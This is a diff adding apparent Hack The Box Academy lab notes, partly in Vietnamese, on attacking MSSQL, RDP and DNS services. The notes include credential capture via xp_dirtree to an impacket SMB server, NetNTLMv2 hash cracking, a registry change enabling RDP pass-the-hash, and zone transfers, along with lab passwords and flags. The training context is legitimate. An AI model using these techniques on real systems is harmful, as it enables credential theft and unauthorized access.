@@ -144,3 +144,156 @@ $ cat flag.txt
 HTB{SMB_4TT4CKS_2349872359}
 ```
 
+# Attacking SQL Databases
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.230.155 (ACADEMY-ATTCOMSVC-WIN-02)   
+
+
+ Authenticate to 10.129.230.155 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"
+
+```zsh
+❯ sqsh -S 10.129.230.155 -U htbdbuser -P 'MSSQLAccess01!' -h
+```
+
+![](images/3.png)
+
+Chúng ta không có quyền truy cập 2 database ở cuối.
+
++ 1  What is the password for the "mssqlsvc" user?
+
+Bruteforce but no luck:
+![](images/4.png)
+
+Thử capture hash
+
+```zsh
+❯ sudo impacket-smbserver share -smb2support ./share
+```
+
+```mssql
+1> EXEC master..xp_dirtree '\\10.10.14.63\share\'
+2> go
+```
+
+```zsh
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.230.155,49679)
+[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
+[*] User WIN-02\mssqlsvc authenticated successfully
+[*] mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:2bb0838adbbcea7743b5e828cad05cf5:0101000000000000009aec3e51bbdb0107fd3b1d2fe8e80d00000000010010006e007700450062004200630061004b00030010006e007700450062004200630061004b00020010004f004b004c007500700058006e007300040010004f004b004c007500700058006e00730007000800009aec3e51bbdb0106000400020000000800300030000000000000000000000000300000ea4a8749c911d3ee21e7b12fc2136fdab3d749ef349608f271169c6999a125280a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360033000000000000000000
+[*] Closing down connection (10.129.230.155,49679)
+[*] Remaining connections []
+```
+
+
+```zsh
+❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
+MSSQLSVC::WIN-02:aaaaaaaaaaaaaaaa:2bb0838adbbcea7743b5e828cad05cf5:0101000000000000009aec3e51bbdb0107fd3b1d2fe8e80d00000000010010006e007700450062004200630061004b00030010006e007700450062004200630061004b00020010004f004b004c007500700058006e007300040010004f004b004c007500700058006e00730007000800009aec3e51bbdb0106000400020000000800300030000000000000000000000000300000ea4a8749c911d3ee21e7b12fc2136fdab3d749ef349608f271169c6999a125280a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360033000000000000000000:princess1
+```
+
+
+
++ 1  Enumerate the "flagDB" database and submit a flag as your answer.
+
+```zsh
+❯ sqsh -S 10.129.230.155 -U .\\mssqlsvc -P 'princess1' -h
+```
+
+```mssql
+1> use flagDB
+2> go
+1> select * from tb_flag
+2> go
+
+        HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}    
+```
+# Attacking RDP
+
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01)   
+
+Life Left: 110 Terminate 
+
+
+ RDP to 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01) with user "htb-rdp" and password "HTBRocks!"
+
++ 1  What is the name of the file that was left on the Desktop? (Format example: filename.txt)
+
+```zsh
+❯ xfreerdp3 /v:10.129.203.13  /u:htb-rdp /p:HTBRocks! /dynamic-resolution
+```
+![](images/5.png)
++ 1  Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?
+
+```powershell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
++ 1  Connect via RDP with the Administrator account and submit the flag.txt as you answer.
+
+![](images/6.png)
+
+```zsh
+❯ xfreerdp3 /v:10.129.203.13  /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution
+```
+
+![](images/7.png)
+
+![](images/8.png)
+![](images/9.png)
+
+
+# Attacking DNS
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.203.6 (ACADEMY-ATTCOMSVC-LIN)   
+
+Life Left: 118 minute(s)  Terminate 
+
++ 1  Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.
+
+Thêm vào file /etc/hosts:
+```zsh
+❯ tail -n 1 /etc/hosts
+10.129.203.6    inlanefreight.htb
+```
+
+Thêm vào resolver.txt:
+
+```zsh
+❯ pwd
+/home/kali/Desktop/learning/attacking_common_services/subbrute
+❯ cat resolvers.txt
+10.129.203.6
+```
+
+Chạy subbrute:
+
+```zsh
+❯ python3 subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt
+```
+
+![](images/10.png)
+
+```zsh
+❯ dig axfr hr.inlanefreight.htb @10.129.203.6 +short
+inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+"HTB{LUIHNFAS2871SJK1259991}"
+ns.inlanefreight.htb.
+127.0.0.1
+inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+```
